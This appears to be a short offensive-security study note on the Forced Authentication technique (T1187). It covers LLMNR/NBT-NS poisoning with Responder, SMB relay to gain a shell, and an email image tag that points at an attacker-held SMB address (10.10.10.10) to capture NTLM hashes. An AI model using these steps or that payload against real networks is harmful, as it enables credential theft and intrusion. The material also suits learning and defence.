---
title: Forced Authentication
tags: [credential-access, responder, llmnr, nbt-ns, smb-relay]
description: Forcing a system to authenticate to an adversary-controlled server to steal hashes.
date: 2024-01-02
---

# Forced Authentication (T1187)

If you can't go to the password, make the password come to you.

## 1. LLMNR / NBT-NS Poisoning
When a computer looks for a hostname `PrintSrv` but DNS fails (typo), it broadcasts to the local network: "Who is PrintSrv?".
- **Tool**: **Responder**.
- **Action**: You answer "I am PrintSrv!".
- **Result**: The victim sends you their NTLMv2 Hash.

## 2. SMB Relay
NTLMv2 hashes cannot be used in Pass-the-Hash. But they *can* be relayed.
- **Requirement**: SMB Signing is DISABLED (Default on Workstations).
- **Attack**:
  1.  Victim connects to You (via LLMNR poisoning).
  2.  You forward the auth request to `Target-PC`.
  3.  `Target-PC` accepts it. You get a shell on `Target-PC`.

## 3. Web Source Code
Include an image tag in an email: `<img src="file://10.10.10.10/logo.png">`.
- When the user opens the email (Outlook), it tries to authenticate to your SMB share. You catch the hash.
